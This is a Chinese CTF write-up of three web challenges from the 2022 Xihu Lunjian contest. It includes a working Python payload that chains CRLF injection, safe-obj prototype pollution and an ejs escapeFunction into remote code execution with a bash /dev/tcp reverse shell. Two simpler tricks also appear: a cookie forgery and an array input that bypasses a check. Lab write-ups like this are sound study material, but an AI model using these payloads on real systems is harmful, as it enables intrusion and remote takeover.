---
title: "2022 西湖论剑 Web 部分 Writeup"
date: 2023-02-032T18:00:53+08:00
lastmod: 2023-02-03T18:00:53+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

web 差一半, 等官方 wp 吧...

团队整体第二名, 学长们 tql

<!--more-->

## real_ez_node

/routes/index.js

```javascript
var express = require('express');
var http = require('http');
var router = express.Router();
const safeobj = require('safe-obj');
router.get('/',(req,res)=>{
  if (req.query.q) {
    console.log('get q');
  }
  res.render('index');
})
router.post('/copy',(req,res)=>{
  res.setHeader('Content-type','text/html;charset=utf-8')
  var ip = req.connection.remoteAddress;
  console.log(ip);
  var obj = {
      msg: '',
  }
  if (!ip.includes('127.0.0.1')) {
      obj.msg="only for admin"
      res.send(JSON.stringify(obj));
      return 
  }
  let user = {};
  for (let index in req.body) {
      if(!index.includes("__proto__")){
          safeobj.expand(user, index, req.body[index])
      }
    }
  res.render('index');
})

router.get('/curl', function(req, res) {
    var q = req.query.q;
    var resp = "";
    if (q) {
        var url = 'http://localhost:3000/?q=' + q
            try {
                http.get(url,(res1)=>{
                    const { statusCode } = res1;
                    const contentType = res1.headers['content-type'];
                  
                    let error;
                    // 任何 2xx 状态码都表示成功响应，但这里只检查 200。
                    if (statusCode !== 200) {
                      error = new Error('Request Failed.\n' +
                                        `Status Code: ${statusCode}`);
                    }
                    if (error) {
                      console.error(error.message);
                      // 消费响应数据以释放内存
                      res1.resume();
                      return;
                    }
                  
                    res1.setEncoding('utf8');
                    let rawData = '';
                    res1.on('data', (chunk) => { rawData += chunk;
                    res.end('request success') });
                    res1.on('end', () => {
                      try {
                        const parsedData = JSON.parse(rawData);
                        res.end(parsedData+'');
                      } catch (e) {
                        res.end(e.message+'');
                      }
                    });
                  }).on('error', (e) => {
                    res.end(`Got error: ${e.message}`);
                  })
                res.end('ok');
            } catch (error) {
                res.end(error+'');
            }
    } else {
        res.send("search param 'q' missing!");
    }
})
module.exports = router;
```

Dockerfile 中的环境是 `node:8.1.2`, 存在 CRLF 注入

参考文章: [https://www.anquanke.com/post/id/240014#h2-11](https://www.anquanke.com/post/id/240014#h2-11)

然后结合已知的 safe-obj 原型链污染, 即 `CVE-2021-25928`, 利用 ejs 进行 rce

构造 payload

```python
from urllib.parse import quote

payload = ''' HTTP/1.1


POST /copy HTTP/1.1
Host: 127.0.0.1:3000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.70
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
Content-Type: application/json
Content-Length: 218

{"constructor.prototype.client":true,"constructor.prototype.escapeFunction":"1; return global.process.mainModule.constructor._load('child_process').execSync('bash -c \\"bash -i >& /dev/tcp/x.x.x.x/yyyy 0>&1\\"');"}

GET /'''.replace('\n', '\r\n')

enc_payload = u''

for i in payload:
    enc_payload += chr(0x0100 + ord(i))

print(quote(enc_payload))
```

![image-20230202180355225](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302021804644.png)

反弹 shell 后执行 `cat /flag` 即可

## 扭转乾坤

直接上传提示 `Sorry,Apache maybe refuse header equals Content-Type: multipart/form-data;.`

![image-20230202180603240](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302021806316.png)

构造错误的 http 包格式就可以绕过

![image-20230202180630208](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302021806297.png)

## Node Magical Login

controller.js

```javascript
const fs = require("fs");
const SECRET_COOKIE = process.env.SECRET_COOKIE || "this_is_testing_cookie"

const flag1 = fs.readFileSync("/flag1")
const flag2 = fs.readFileSync("/flag2")


function LoginController(req,res) {
    try {
        const username = req.body.username
        const password = req.body.password
        if (username !== "admin" || password !== Math.random().toString()) {
            res.status(401).type("text/html").send("Login Failed")
        } else {
            res.cookie("user",SECRET_COOKIE)
            res.redirect("/flag1")
        }
    } catch (__) {}
}

function CheckInternalController(req,res) {
    res.sendFile("check.html",{root:"static"})

}

function CheckController(req,res) {
    let checkcode = req.body.checkcode?req.body.checkcode:1234;
    console.log(req.body)
    if(checkcode.length === 16){
        try{
            checkcode = checkcode.toLowerCase()
            if(checkcode !== "aGr5AtSp55dRacer"){
                res.status(403).json({"msg":"Invalid Checkcode1:" + checkcode})
            }
        }catch (__) {}
        res.status(200).type("text/html").json({"msg":"You Got Another Part Of Flag: " + flag2.toString().trim()})
    }else{
        res.status(403).type("text/html").json({"msg":"Invalid Checkcode2:" + checkcode})
    }
}

function Flag1Controller(req,res){
    try {
        if(req.cookies.user === SECRET_COOKIE){
            res.setHeader("This_Is_The_Flag1",flag1.toString().trim())
            res.setHeader("This_Is_The_Flag2",flag2.toString().trim())
            res.status(200).type("text/html").send("Login success. Welcome,admin!")
        }
        if(req.cookies.user === "admin") {
            res.setHeader("This_Is_The_Flag1", flag1.toString().trim())
            res.status(200).type("text/html").send("You Got One Part Of Flag! Try To Get Another Part of Flag!")
        }else{
            res.status(401).type("text/html").send("Unauthorized")
        }
    }catch (__) {}
}



module.exports = {
    LoginController,
    CheckInternalController,
    Flag1Controller,
    CheckController
}
```

构造 cookie `user=admin` 拿到前半部分 flag

![image-20230202180812631](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302021808709.png)

因为 CheckController 在检查 checkcode 的时候没有对 catch 到的异常进行处理, 所以可以构造一个长度为 16 的数组使得调用 `checkcode.toLowerCase()` 时报错, 然后进入 `catch (__) {}`, 最后顺下去执行得到后半部分 flag

```json
{"checkcode":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]}
```

![image-20230202181034296](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302021810378.png)